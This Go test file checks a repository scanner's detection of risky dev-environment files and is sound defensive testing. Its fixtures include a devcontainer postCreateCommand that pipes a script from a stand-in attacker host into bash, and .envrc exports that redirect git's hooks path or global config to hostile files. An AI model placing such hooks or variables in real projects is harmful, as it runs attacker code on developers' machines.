package scanner_test

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func TestDevenv_NoDevenvFiles(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "main.go"), []byte("package main"), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewDevenvModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}

func TestDevenv_DevcontainerWithLifecycleHooks(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, ".devcontainer"), 0755); err != nil {
		t.Fatal(err)
	}
	cfg := map[string]any{
		"name":              "Dev Container",
		"image":             "mcr.microsoft.com/devcontainers/go:1.22",
		"postCreateCommand": "curl http://evil.com/init.sh | bash",
		"postStartCommand":  "node /tmp/evil.js",
	}
	data, _ := json.Marshal(cfg)
	if err := os.WriteFile(filepath.Join(dir, ".devcontainer", "devcontainer.json"), data, 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewDevenvModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected findings for lifecycle hooks, got none")
	}
	for _, f := range findings {
		if f.Severity != scanner.High {
			t.Errorf("severity = %v, want HIGH", f.Severity)
		}
	}
}

func TestDevenv_DevcontainerNoHooks(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, ".devcontainer"), 0755); err != nil {
		t.Fatal(err)
	}
	cfg := map[string]any{
		"name":  "Dev Container",
		"image": "mcr.microsoft.com/devcontainers/go:1.22",
	}
	data, _ := json.Marshal(cfg)
	if err := os.WriteFile(filepath.Join(dir, ".devcontainer", "devcontainer.json"), data, 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewDevenvModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("devcontainer without hooks got %d findings, want 0", len(findings))
	}
}

func TestDevenv_EnvrcPresence(t *testing.T) {
	dir := t.TempDir()
	envrcContent := "export PATH=$PATH:/usr/local/bin\nlayout python3\n"
	if err := os.WriteFile(filepath.Join(dir, ".envrc"), []byte(envrcContent), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewDevenvModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for .envrc presence, got none")
	}

	found := false
	for _, f := range findings {
		if f.Severity == scanner.High {
			found = true
		}
	}
	if !found {
		t.Error("expected at least one HIGH finding for .envrc")
	}
}

func TestDevenv_EnvrcWithGitConfigVars(t *testing.T) {
	dir := t.TempDir()
	// GIT_CONFIG_COUNT/KEY/VALUE can override any git config, including
	// core.hooksPath – bypassing all of git-protect's config-based defenses.
	envrcContent := "export GIT_CONFIG_COUNT=1\nexport GIT_CONFIG_KEY_0=core.hooksPath\nexport GIT_CONFIG_VALUE_0=/tmp/evil-hooks\n"
	if err := os.WriteFile(filepath.Join(dir, ".envrc"), []byte(envrcContent), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewDevenvModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	var hasCritical bool
	for _, f := range findings {
		if f.Severity == scanner.Critical {
			hasCritical = true
		}
	}
	if !hasCritical {
		t.Error("expected CRITICAL finding for GIT_CONFIG_* in .envrc")
	}
}

func TestDevenv_EnvrcWithGitConfigGlobal(t *testing.T) {
	dir := t.TempDir()
	// GIT_CONFIG_GLOBAL overrides the global git config file path entirely.
	envrcContent := "export GIT_CONFIG_GLOBAL=/tmp/evil.gitconfig\n"
	if err := os.WriteFile(filepath.Join(dir, ".envrc"), []byte(envrcContent), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewDevenvModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	var hasCritical bool
	for _, f := range findings {
		if f.Severity == scanner.Critical {
			hasCritical = true
		}
	}
	if !hasCritical {
		t.Error("expected CRITICAL finding for GIT_CONFIG_GLOBAL in .envrc")
	}
}

func TestDevenv_Name(t *testing.T) {
	m := scanner.NewDevenvModule()
	if m.Name() != "devenv" {
		t.Errorf("Name() = %q, want %q", m.Name(), "devenv")
	}
}
